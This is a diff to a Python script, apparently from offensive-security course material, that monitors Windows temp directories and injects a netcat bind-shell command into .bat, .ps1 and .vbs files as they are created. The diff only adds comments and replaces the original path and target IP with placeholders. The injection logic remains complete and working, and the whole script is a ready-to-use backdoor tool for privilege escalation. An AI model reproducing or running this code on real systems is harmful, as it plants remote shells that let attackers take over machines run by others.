@@ -1,8 +1,11 @@
+'''
+A script that can inject code into a file while monitoring it.
+'''
 import os
-import tempfile
-import threading
+import tempfile  # Create TEMP files
+import threading  # Multithread
 import win32con
-import win32file
+import win32file  # File control for Windows
 
 FILE_CREATED = 1
 FILE_DELETED = 2
@@ -12,11 +15,11 @@ FILE_RENAMED_TO = 5
 
 FILE_LIST_DIRECTORY = 0x0001
 
-NETCAT = 'c:\\users\\tim\\work\\netcat.exe'
-TGT_IP = '192.168.1.208'
-CMD = f'{NETCAT} -t {TGT_IP} -p 9999 -l -c '
+NETCAT = '<Path to Netcat tool here!>'  # Path to Netcat
+TGT_IP = '<Target IP here!>'  # Target IP
+CMD = f'{NETCAT} -t {TGT_IP} -p 9999 -l -c '  # Netcat command to be ran, you can customize it yourself
 
-FILE_TYPES = {
+FILE_TYPES = {  # Different file types to look for
     '.bat': ["\r\nREM bhpmarker\r\n", f'\r\n{CMD}\r\n'],
     '.ps1': ["\r\n#bhpmarker\r\n", f'\r\nStart-Process "{CMD}"\r\n'],
     '.vbs': ["\r\n'bhpmarker\r\n", f'\r\nCreateObject("Wscript.Shell").Run("{CMD}")\r\n'],
@@ -24,7 +27,11 @@ FILE_TYPES = {
 
 PATHS = ['c:\\Windows\\Temp', tempfile.gettempdir()]
 
+
 def inject_code(full_filename, contents, extension):
+    '''
+    Inject code into a file.
+    '''
     if FILE_TYPES[extension][0].strip() in contents:
         return
     
@@ -32,10 +39,14 @@ def inject_code(full_filename, contents, extension):
     full_contents += FILE_TYPES[extension][1]
     full_contents += contents
     with open(full_filename, 'w') as f:
-        f.write(full_contents)
+        f.write(full_contents)  # Write code
     print('\\o/ Injected Code')
 
+
 def monitor(path_to_watch):
+    '''
+    The monitor
+    '''
     h_directory = win32file.CreateFile(
         path_to_watch,
         FILE_LIST_DIRECTORY,
@@ -89,15 +100,14 @@ def monitor(path_to_watch):
                     print(f'[<] Renamed to {full_filename}')
                 else:
                     print(f'[?] Unknown action on {full_filename}')
-        except KeyboardInterrupt:
+        except KeyboardInterrupt:  # Stop by CTRL-C
             break
     
-        except Exception:
+        except Exception:  # Skip errors
             pass
-    
 
 
 if __name__ == '__main__':
     for path in PATHS:
-        monitor_thread = threading.Thread(target=monitor, args=(path,))
-        monitor_thread.start()
+        monitor_thread = threading.Thread(target=monitor, args=(path,))  # Spawn thread
+        monitor_thread.start()  # Start thread
